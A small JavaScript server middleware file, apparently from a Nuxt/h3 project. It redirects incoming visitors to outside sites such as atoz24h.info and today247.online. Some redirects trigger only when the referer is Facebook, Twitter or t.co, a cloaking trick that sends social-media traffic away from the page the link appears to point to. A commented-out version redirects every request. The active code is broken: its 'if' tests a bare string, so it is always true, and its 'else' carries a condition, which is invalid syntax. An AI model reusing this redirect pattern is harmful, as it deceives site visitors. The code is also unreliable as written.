/* export default  (req, res, next) => {
    console.log(req.url);
    const headers = req.headers;
    res.redirect("https://ufo.nepalikhabar24hour.com"+req.url);
    if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
        res.redirect("https://ufo.nepalikhabar24hour.com"+req.url);
    } else {
        next();
    }
};
 */

export default defineEventHandler((event) => {
    const headers = event.req.headers;
    
    if ('https://test-zt.vercel.app/taylor-swift-nashville-concert-forecast-storms-likely-sunday/') {
        sendRedirect(event,"https://atoz24h.info/how-camila-cabello-maintained-her-shaggy-waves-all-night-at-the-2023-grammys/");
    }
    else (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
        sendRedirect(event,"https://today247.online"+event.req.url);
    }
    
})
